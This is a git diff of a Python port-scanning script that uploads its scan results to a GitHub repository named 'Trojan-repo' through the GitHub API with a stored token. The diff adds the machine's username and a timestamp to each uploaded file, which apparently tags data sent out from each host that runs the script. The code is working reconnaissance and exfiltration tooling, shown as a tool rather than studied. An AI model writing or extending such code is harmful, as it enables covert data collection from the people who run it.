@@ -6,9 +6,7 @@ import os
 import json
 import requests
 import base64
-import socket
 import threading
-import json
 from dotenv import load_dotenv
 
 class Portscan:
@@ -59,8 +57,12 @@ open_ports = security_tool.scan(target_ip, ports)
 # Print the open ports
 print(f"Open ports: {open_ports}")
 
-# Write the open ports to an output file
-output_file = "open_ports.json"
+# Create a unique file name for the output
+username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
+current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+output_file = f"open_ports_{username}_{current_time}.json"
+
+# Write the open ports to the output file
 with open(output_file, "w") as file:
     json.dump({"target_ip": target_ip, "open_ports": open_ports}, file, indent=4)
 
@@ -73,17 +75,16 @@ with open(output_file, "r") as file:
 # The content of the output file is now stored in the variable 'data'
 print("Data from file:", data)
 
-
 # GitHub repository details
 repository_owner = "BlertaJashanica"
 repository_name = "Trojan-repo"
-file_path = "data/portscan.json"  # Correct file path with filename
+file_path = f"data/portscan_{username}_{current_time}.json"  # Dynamic file path
 file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub
 
 load_dotenv()  # Load environment variables from .env file
 github_token = os.getenv("GITHUB_TOKEN")
 
-commit_message = 'Updated system info'
+commit_message = 'Updated portscan data'
 
 # GitHub API URL
 api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
@@ -116,4 +117,3 @@ if response.status_code in [200, 201]:
     print("File pushed successfully!")
 else:
     print("An error occurred while pushing the file:", response.json())
-
